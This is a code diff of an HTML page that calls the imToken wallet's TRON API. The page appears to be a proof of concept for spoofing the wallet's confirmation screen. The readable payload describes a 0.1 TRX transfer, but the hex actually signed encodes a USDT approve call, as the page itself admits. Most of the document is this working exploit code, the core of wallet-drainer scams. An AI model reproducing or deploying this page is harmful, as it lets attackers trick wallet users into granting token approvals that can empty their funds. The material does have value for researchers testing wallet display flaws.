@@ -8,50 +8,67 @@
         body{font-family:system-ui,sans-serif;background:#111;color:#0f0;padding:20px;text-align:center}
         button{padding:18px 40px;font-size:18px;background:#0b8;margin:20px;border:none;border-radius:8px;cursor:pointer}
         .info{margin:15px;padding:15px;background:#222;border-radius:6px}
+        pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:12px;overflow:auto}
     </style>
 </head>
 <body>
     <h1>imToken TRON 测试页面</h1>
-    <div class="info">点击按钮将显示发送 0.1 TRX<br>实际可能为 USDT Approve</div>
+    <div class="info">
+        点击按钮将显示：<br>
+        发送 0.1 TRX 到 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz<br>
+        <strong>实际可能为 USDT Approve</strong>
+    </div>
     <button onclick="sendTx()">发送 0.1 TRX</button>
 
+    <pre id="log"></pre>
+
     <script>
+        function log(msg) {
+            document.getElementById('log').textContent += msg + '\n';
+        }
+
         async function sendTx() {
             if (!window.imToken) {
-                alert("请在 imToken DApp 浏览器中打开");
+                alert("请在 imToken DApp 浏览器中打开此页面");
                 return;
             }
 
-            try {
-                const account = await window.imToken.callPromisifyAPI("tron.getAccount");
-                const owner = account.address;
+            log("imToken 环境已检测");
 
-                const payload = {
-                    "raw_data": {
-                        "contract": [{
-                            "type": "TransferContract",
-                            "parameter": {
-                                "value": {
-                                    "owner_address": owner,
-                                    "to_address": "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
-                                    "amount": 100000
-                                }
+            // 请将下面地址替换成你的 imToken TRON 钱包地址（Base58）
+            const owner = "替换成你的TRON地址";   // ←←← 修改这里
+
+            const payload = {
+                "raw_data": {
+                    "contract": [{
+                        "type": "TransferContract",
+                        "parameter": {
+                            "value": {
+                                "owner_address": owner,
+                                "to_address": "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
+                                "amount": 100000
                             }
-                        }],
-                        "ref_block_bytes": "0x0000",
-                        "ref_block_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
-                        "expiration": Date.now() + 3600000,
-                        "timestamp": Date.now()
-                    },
-                    "raw_data_hex": "0a0200002208" + "0".repeat(64) + "40" + "0".repeat(10) + "5a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.slice(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
-                };
+                        }
+                    }],
+                    "ref_block_bytes": "0000",
+                    "ref_block_hash": "0000000000000000000000000000000000000000000000000000000000000000",
+                    "expiration": Date.now() + 3600000,
+                    "timestamp": Date.now()
+                },
+                "raw_data_hex": "0a0200002208000000000000000040e0f3d9b3b9b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.substring(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
+            };
 
+            log("准备发送 payload...");
+            console.log(payload);
+
+            try {
                 const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", payload);
-                console.log(result);
-                alert("交易提交成功！请检查确认页显示与链上结果");
+                log("成功提交: " + JSON.stringify(result));
+                alert("交易已提交！请检查确认页显示（TRX转账）与链上实际结果");
             } catch(e) {
+                log("错误: " + e.message);
                 console.error(e);
-                alert("错误: " + e.message);
+                alert("调用失败: " + e.message);
             }
         }
     </script>
